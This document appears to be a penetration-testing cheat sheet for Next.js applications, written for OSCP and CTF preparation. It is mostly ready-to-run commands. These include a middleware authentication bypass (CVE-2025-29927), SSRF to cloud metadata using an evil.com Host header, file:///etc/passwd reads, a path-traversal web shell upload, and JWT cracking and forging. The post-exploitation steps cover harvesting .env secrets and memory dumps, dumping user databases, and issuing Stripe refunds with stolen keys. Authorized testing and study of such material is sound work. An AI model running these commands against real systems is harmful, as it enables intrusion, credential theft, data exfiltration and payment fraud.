# Next.js

> Next.js (React meta-framework) reference for penetration testing. Covers
> detection, enumeration, known CVEs, exploitation patterns, misconfigurations,
> and post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### Response headers

Next.js sets distinctive headers:

```bash
curl -sI http://<TARGET>:3000/ | grep -iE '^(server|x-powered-by|x-nextjs|x-middleware|set-cookie|vary)'
```

Expected output:

```text
X-Powered-By: Next.js
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url
X-Nextjs-Cache: HIT
Set-Cookie: __Host-next-auth.csrf-token=...; Path=/; Secure; HttpOnly; SameSite=Lax
```

Strong fingerprints:
- `X-Powered-By: Next.js` (unless explicitly disabled)
- `Vary: RSC, Next-Router-State-Tree, ...` (App Router)
- `X-Nextjs-Cache` (Vercel caching)
- `__Host-next-auth.*` cookies (NextAuth.js)
- `__Secure-next-auth.session-token` (NextAuth.js)

### Default response body

Next.js pages include:

```html
<script src="/_next/static/chunks/main-abc123.js"></script>
<script src="/_next/static/chunks/pages/_app-abc123.js"></script>
<link rel="preload" href="/_next/static/css/abc123.css" as="style">
```

The `/_next/static/` path is a **definitive** Next.js fingerprint.

### Error pages

**Default 404 (Pages Router):**

```text
404
This page could not be found.
```

**Default 404 (App Router):**

Same default or custom `not-found.tsx`.

**Dev error overlay (dev mode):**

```text
Unhandled Runtime Error
Error: ...
Call Stack
...
```

Full stack trace + source map in dev.

### Default ports

- `3000` - `next dev` and `next start`
- `80` / `443` - behind nginx / Vercel edge

### nmap / whatweb

```bash
nmap -sV -p 80,443,3000,8080 --script http-headers,http-title <TARGET>
whatweb -a 3 http://<TARGET>:3000/
```

---

## 2. Enumeration

### Build manifest leak

Next.js exposes `/_next/static/<buildId>/_buildManifest.js` and
`/_next/static/<buildId>/_ssgManifest.js`, listing all client routes:

```bash
# Get buildId from main page
curl -s http://<TARGET>:3000/ | grep -oE '"buildId":"[^"]+"'
# Or:
curl -s http://<TARGET>:3000/_next/static/BUILD_ID/_buildManifest.js | head -c 500
```

Replace `BUILD_ID` with the extracted value. The manifest lists:

- All page routes
- All dynamic route patterns
- All chunk mappings

### `__NEXT_DATA__` leak (Pages Router)

Every page includes a JSON blob in `__NEXT_DATA__`:

```bash
curl -s http://<TARGET>:3000/ | grep -oE '<script id="__NEXT_DATA__"[^>]*>.*</script>' | sed 's/<[^>]*>//g' | jq .
```

Expected output:

```json
{
  "props": {
    "pageProps": {
      "user": {...},
      "featureFlags": {...},
      "config": {...}
    }
  },
  "page": "/",
  "query": {},
  "buildId": "abc123",
  "runtimeConfig": {...}
}
```

`runtimeConfig` often contains API base URLs, public keys, feature flags.
`pageProps` may leak user data (SSR-loaded).

### `/api/` routes

Next.js API routes at `/api/*`:

```bash
for p in /api/hello /api/users /api/auth/session /api/auth/providers \
         /api/auth/csrf /api/health /api/admin /api/debug; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>:3000$p")
  echo "$code  $p"
done
```

### NextAuth.js enumeration

If NextAuth is used:

```bash
curl -s http://<TARGET>:3000/api/auth/providers | jq .
curl -s http://<TARGET>:3000/api/auth/session | jq .
curl -s http://<TARGET>:3000/api/auth/csrf | jq .
```

`/api/auth/providers` lists all configured providers (Google, GitHub, credentials).

### Server Actions (App Router)

App Router uses Server Actions:

```bash
curl -s http://<TARGET>:3000/ | grep -oE '"action":"[^"]*"'
```

Server Action IDs are hashes; call them via POST with `Next-Action: <id>` header.

### Source maps (dev or unminified)

```bash
curl -s http://<TARGET>:3000/_next/static/chunks/main-abc123.js.map -o main.js.map
jq -r '.sources[]' main.js.map | head -50
```

If `.js.map` files are served (dev or misconfigured prod), the full source
tree is recoverable:

```bash
npx source-map-explorer main.js.map
```

### Static file enumeration

```bash
for p in /_next/static/chunks/ /_next/static/css/ /public/ /static/ \
         /robots.txt /sitemap.xml /favicon.ico; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>:3000$p")
  echo "$code  $p"
done
```

### Directory / route brute force

```bash
feroxbuster -u http://<TARGET>:3000/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x json,js,map
```

### Build ID extraction

Build ID changes every deploy. Extract:

```bash
curl -s http://<TARGET>:3000/ | grep -oE '"buildId":"[^"]+"' | cut -d'"' -f4
```

Then enumerate the build manifest:

```bash
BUILD_ID=$(curl -s http://<TARGET>:3000/ | grep -oE '"buildId":"[^"]+"' | cut -d'"' -f4)
curl -s "http://<TARGET>:3000/_next/static/$BUILD_ID/_buildManifest.js" | head -c 1000
```

---

## 3. Known CVEs

### CVE-2025-29927 - Next.js Middleware Authorization Bypass

Critical. `x-middleware-subrequest` header allows bypassing middleware
(including auth middleware) by faking subrequest depth.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2025-29927
Affected: Next.js 11.x - 15.x (specific patch levels).

PoC:

```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     http://<TARGET>:3000/admin
```

If the middleware only checks auth on the top-level path, this bypasses it
entirely.

Patched in: 12.3.5, 13.5.9, 14.2.25, 15.2.3.

### CVE-2024-46982 - Cache Poisoning (Next.js)

Cache poisoning via crafted `RSC` header to serve attacker-controlled content
to other users.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-46982
Affected: Next.js 13.x - 14.x (specific patch levels).

### CVE-2024-34351 - SSRF via Server Actions

`fetch` in Server Actions with user-controlled `Host` header -> SSRF.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-34351
Affected: Next.js 14.x < 14.1.1, 13.x < 13.5.1.

### CVE-2023-46298 - Missing authentication in middleware

Apps using middleware for auth but exposing server components without
verification -> bypass.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-46298
Affected: Next.js 14.x < 14.0.4, 13.x < 13.5.2.

### CVE-2023-34092 - `@next/font` local file read

Improper input validation in `@next/font` -> local file read.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-34092
Affected: next < 13.4.20 (specific configs).

### CVE-2022-36055 - `image-optimizer` DoS

Denial of service via crafted image request.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-36055
Affected: Next.js < 12.2.4.

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| 11.x - 15.x (pre-patch) | Middleware auth bypass | CVE-2025-29927 |
| 13.x - 14.x | Cache poisoning | CVE-2024-46982 |
| 14.x < 14.1.1 | SSRF via Server Actions | CVE-2024-34351 |
| 14.x < 14.0.4 | Middleware bypass | CVE-2023-46298 |
| < 12.2.4 | Image optimizer DoS | CVE-2022-36055 |

---

## 4. Exploitation Patterns

### Middleware auth bypass (CVE-2025-29927)

The critical Next.js vulnerability of 2025. When auth is enforced only in
`middleware.ts` (common pattern), the header bypasses it:

```bash
# Bypass middleware auth -> access /admin
curl -s -H "x-middleware-subrequest: middleware" http://<TARGET>:3000/admin

# Bypass from subdirectory
curl -s -H "x-middleware-subrequest: pages/_middleware" http://<TARGET>:3000/admin

# Some variants require the loop detection name; try several:
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://<TARGET>:3000/admin
curl -s -H "x-middleware-subrequest: pages/_middleware:pages/_middleware" http://<TARGET>:3000/admin
```

Expected output (bypass success):

```html
<h1>Admin Dashboard</h1>
<!-- admin content served without auth -->
```

Check if the app is vulnerable:

```bash
# Version check
curl -s http://<TARGET>:3000/_next/static/BUILD_ID/_buildManifest.js | grep -oE 'next@[0-9.]+' | head -1

# Or check headers
curl -sI http://<TARGET>:3000/ | grep -i 'x-powered-by\|x-nextjs'
```

### `__NEXT_DATA__` -> hidden API endpoints

Extract all API routes from `__NEXT_DATA__` and manifests:

```bash
BUILD_ID=$(curl -s http://<TARGET>:3000/ | grep -oE '"buildId":"[^"]+"' | cut -d'"' -f4)
curl -s "http://<TARGET>:3000/_next/static/$BUILD_ID/_buildManifest.js" | \
  grep -oE '"/[a-zA-Z0-9_/-]+"' | sort -u
```

### SSRF via Server Actions (CVE-2024-34351)

Server Actions running `fetch(user_url)` with `Host` header trusted:

```bash
# Get a Server Action ID from the page
curl -s http://<TARGET>:3000/page | grep -oE '"\\$ACTION_ID_[a-f0-9]+"'

# Craft a request with a malicious Host header
curl -X POST http://<TARGET>:3000/page \
  -H "Host: evil.com" \
  -H "Next-Action: <action-id>" \
  -d "url=http://169.254.169.254/latest/meta-data/"
```

### NextAuth.js JWT secret brute

NextAuth.js signs JWTs with `NEXTAUTH_SECRET`. If weak:

```bash
# Extract session token
curl -s http://<TARGET>:3000/api/auth/session | jq .

# Crack JWT (HS256)
hashcat -m 16500 nextauth_jwt.txt rockyou.txt
# Or use jwt_tool
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
```

Then forge a session:

```bash
python3 -c "
import jwt
print(jwt.encode({'sub':'1','email':'admin@example.com','role':'admin'}, 'secret', algorithm='HS256'))
"
```

### `runtimeConfig` leak

If `runtimeConfig` includes `NEXT_PUBLIC_*` env vars:

```bash
curl -s http://<TARGET>:3000/ | grep -oE '"runtimeConfig":\{[^}]+\}' | jq .
```

Watch for: `NEXT_PUBLIC_API_URL`, `NEXT_PUBLIC_STRIPE_KEY`, `NEXT_PUBLIC_MAPBOX_KEY`.
Public keys (by design) but often misused.

### Static file upload

App Router Server Actions handling file uploads are often vulnerable to:

- Path traversal in filename
- Arbitrary extension upload
- Zip slip (if extracted)

```bash
curl -X POST http://<TARGET>:3000/api/upload \
  -H "Next-Action: <action-id>" \
  -F "file=@shell.js;filename=../../../../app/public/shell.js"
curl http://<TARGET>:3000/shell.js
```

### Server-Side Rendering (SSR) injection

If SSR calls `dangerouslySetInnerHTML` with user input, XSS is direct:

```bash
curl "http://<TARGET>:3000/comment?text=<img src=x onerror=alert(1)>"
```

### ISR / cache poisoning

Next.js ISR (Incremental Static Regeneration) can serve poisoned content:

```bash
# Trigger a cache revalidation with attacker-controlled input
curl -H "x-prerender-revalidate: <revalidate-token>" http://<TARGET>:3000/page
```

### React Server Components deserialization

RSC payloads from client are deserialized server-side. Next.js handles this
securely, but custom RSC handlers may be vulnerable:

```bash
# Send crafted RSC payload
curl -X POST http://<TARGET>:3000/ \
  -H "RSC: 1" \
  -H "Next-Router-State-Tree: <crafted>" \
  -d "0[\"$\",\"div\",null,{\"children\":\"crafted\"}]"
```

Not exploitable in stock Next.js; relevant only for custom implementations.

### API route IDOR

Next.js API routes are ordinary handlers; IDOR is common:

```bash
curl http://<TARGET>:3000/api/users/1
curl http://<TARGET>:3000/api/users/2
curl http://<TARGET>:3000/api/orders/1
```

### NextAuth.js OAuth misconfig

If an OAuth provider is misconfigured (weak client secret, open redirect URI):

```bash
curl -s http://<TARGET>:3000/api/auth/providers | jq .
```

Look for: redirect URI wildcards, provider secrets leaked in env.

### Image optimizer SSRF (older versions)

`/_next/image?url=` fetched user URLs -> SSRF in older configs:

```bash
curl "http://<TARGET>:3000/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"
```

Also file:// in some variants:

```bash
curl "http://<TARGET>:3000/_next/image?url=file:///etc/passwd&w=64&q=75"
```

---

## 5. Misconfigurations

### `NEXT_PUBLIC_*` env vars leak

By design, `NEXT_PUBLIC_*` env vars are exposed to the browser. But devs
sometimes put secrets in them:

```bash
curl -s http://<TARGET>:3000/ | grep -oE 'NEXT_PUBLIC_[A-Z_]+:"[^"]+"' | sort -u
```

Watch for:
- `NEXT_PUBLIC_SUPABASE_ANON_KEY` (public, but check RLS)
- `NEXT_PUBLIC_FIREBASE_API_KEY` (public, but check rules)
- `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY` (public, but check webhook secret leak)
- `NEXT_PUBLIC_API_URL` (may point to internal endpoints)

### `.env` exposed

```bash
for f in .env .env.local .env.production .env.development; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>:3000/$f")
  echo "$code  $f"
done
```

If exposed:

```text
DATABASE_URL=postgres://user:pass@host/db
NEXTAUTH_SECRET=...
NEXTAUTH_URL=https://app.example.com
STRIPE_SECRET_KEY=sk_live_...
SUPABASE_SERVICE_ROLE_KEY=...
```

### Source maps in production

```bash
BUILD_ID=$(curl -s http://<TARGET>:3000/ | grep -oE '"buildId":"[^"]+"' | cut -d'"' -f4)
curl -sI "http://<TARGET>:3000/_next/static/chunks/main-$BUILD_ID.js.map" | head -1
```

If 200, full source is recoverable.

### NextAuth without `NEXTAUTH_SECRET`

```bash
curl -s http://<TARGET>:3000/api/auth/session
```

If error mentions "Please define a `secret`", NextAuth is unconfigured. Sessions
may be forgeable.

### Missing security headers

```bash
curl -sI http://<TARGET>:3000/ | grep -iE 'content-security-policy|strict-transport|x-frame-options'
```

Next.js does not set these by default; requires `next.config.js` headers.

### Exposed `.next/` build artifacts

```bash
for p in /.next/ /_next/ /out/ /build/; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>:3000$p")
  echo "$code  $p"
done
```

If `.next/` (whole build dir) is served -> full source + config leak.

### `next.config.js` exposed

```bash
for f in next.config.js next.config.mjs next.config.ts package.json; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>:3000/$f")
  echo "$code  $f"
done
```

`next.config.js` may reveal redirects, rewrites, headers, custom webpack config.

### Public directory listing

```bash
curl -s http://<TARGET>:3000/static/ | grep -i 'index of'
```

### CORS misconfig

```bash
curl -sI -H "Origin: https://evil.com" http://<TARGET>:3000/api/ | grep -i 'access-control'
```

### Dev mode in production

`Server: next dev` or presence of dev-only routes (`/__nextjs_original-stack-frame`):

```bash
curl -s "http://<TARGET>:3000/__nextjs_original-stack-frame?file=...&lineNumber=1&column=1" | head -c 200
```

If 200, Next.js is running in dev mode.

---

## 6. Post-Exploitation

### Config file locations

| Layout | Path |
|--------|------|
| Standard | `<app>/.env`, `<app>/.env.local`, `<app>/.env.production` |
| Config | `<app>/next.config.js`, `<app>/next.config.mjs` |
| Build | `<app>/.next/` |
| Public | `<app>/public/` |

### What to look for

```bash
find / -name '.env' -not -path '*/node_modules/*' 2>/dev/null
cat /app/.env
cat /app/.env.local
cat /app/.env.production
cat /app/next.config.js
```

Key items in `.env`:

- `DATABASE_URL` -> DB access (postgres / mysql / mongo)
- `NEXTAUTH_SECRET` -> JWT forgery, session forgery
- `NEXTAUTH_URL` -> deployment URL
- `STRIPE_SECRET_KEY` -> payments
- `SUPABASE_SERVICE_ROLE_KEY` -> bypasses RLS, full DB
- `SENDGRID_API_KEY` -> email
- `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` -> cloud pivot
- `OPENAI_API_KEY` -> language models (misuse)

### Supabase service role abuse

If `SUPABASE_SERVICE_ROLE_KEY` leaks, RLS is bypassed:

```bash
curl "https://<project>.supabase.co/rest/v1/users?select=*" \
  -H "apikey: $SUPABASE_SERVICE_ROLE_KEY" \
  -H "Authorization: Bearer $SUPABASE_SERVICE_ROLE_KEY"
```

Full read/write on all tables.

### Database access

From `DATABASE_URL`:

```bash
# PostgreSQL
psql "$DATABASE_URL" -c "SELECT * FROM users LIMIT 10;"
psql "$DATABASE_URL" -c "SELECT email, password FROM users WHERE role = 'admin';"

# MySQL
mysql -h <host> -u <user> -p<password> <db>

# MongoDB
mongosh "$DATABASE_URL"
```

NextAuth with Prisma adapter stores users in DB with bcrypt hashes.

### Session store

NextAuth with database sessions:

```bash
psql "$DATABASE_URL" -c "SELECT * FROM sessions;"
psql "$DATABASE_URL" -c "SELECT sessionToken, userId, expires FROM sessions;"
```

With JWT strategy, `NEXTAUTH_SECRET` allows forging any session.

### `.next/` analysis

```bash
ls -la /app/.next/
find /app/.next/ -name '*.js' -o -name '*.json' 2>/dev/null | head
cat /app/.next/BUILD_ID
cat /app/.next/server/pages-manifest.json | jq .
cat /app/.next/routes-manifest.json | jq .
```

`routes-manifest.json` includes all redirects, rewrites, headers.

### Process memory

Node process holds all secrets in memory. With `gcore`:

```bash
gcore $(pgrep -f 'next' | head -1)
strings core.* | grep -iE 'NEXTAUTH_SECRET|postgres://|sk_live' | sort -u
```

### Logs

```bash
ls -la /app/logs/ /var/log/next/ ~/.pm2/logs/ 2>/dev/null
tail -n 200 /app/logs/next.log
```

### Node inspector

If `--inspect` is running (port 9229):

```bash
curl http://<TARGET>:9229/json
# Connect chrome://inspect -> evaluate arbitrary JS
```

### Stripe / payment integration

If `STRIPE_SECRET_KEY` leaks:

```bash
curl https://api.stripe.com/v1/customers \
  -u "$STRIPE_SECRET_KEY:" | jq .data | head -30

curl https://api.stripe.com/v1/charges \
  -u "$STRIPE_SECRET_KEY:" | jq .data | head -30

# Refund / create charges
curl https://api.stripe.com/v1/refunds \
  -u "$STRIPE_SECRET_KEY:" -d charge=ch_xxx
```

### Supabase RLS check

Even with anon key, RLS may be disabled:

```bash
curl "https://<project>.supabase.co/rest/v1/users?select=*" \
  -H "apikey: $NEXT_PUBLIC_SUPABASE_ANON_KEY" \
  -H "Authorization: Bearer $NEXT_PUBLIC_SUPABASE_ANON_KEY"
```

If returns all users, RLS is misconfigured -> full DB dump with public key.

### Vercel-specific

If hosted on Vercel, environment variables are visible in:

- Vercel dashboard (requires Vercel account access)
- `/var/task/.env` (inside serverless function, unavailable from web)
- Not directly accessible from web

But `/api/*` serverless functions may leak env if they return `process.env`.

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the `X-Powered-By: Next.js` header AND a `/_next/static/` asset path - together they identify Next.js.

> [!IMPORTANT]
> OSCP report: for CVE-2025-29927 (middleware bypass), screenshot the `x-middleware-subrequest` header AND the protected page content served without auth.

> [!IMPORTANT]
> OSCP report: for `__NEXT_DATA__` leak, screenshot the JSON blob with sensitive props (API URLs, feature flags, user data).

---

## 8. References

- Next.js official docs: https://nextjs.org/docs
- Next.js security advisories: https://github.com/vercel/next.js/security/advisories
- NVD search: https://nvd.nist.gov/vuln/search/results?query=next.js
- CVE-2025-29927 writeup: https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
- CVE-2024-34351 writeup: https://www.assetnote.io/resources/research/diving-into-next-js-a-deep-dive-into-server-action-vulnerabilities
- NextAuth.js security: https://next-auth.js.org/security
- HackTricks - Next.js: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nextjs
- Source map explorer: https://github.com/danvk/source-map-explorer

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*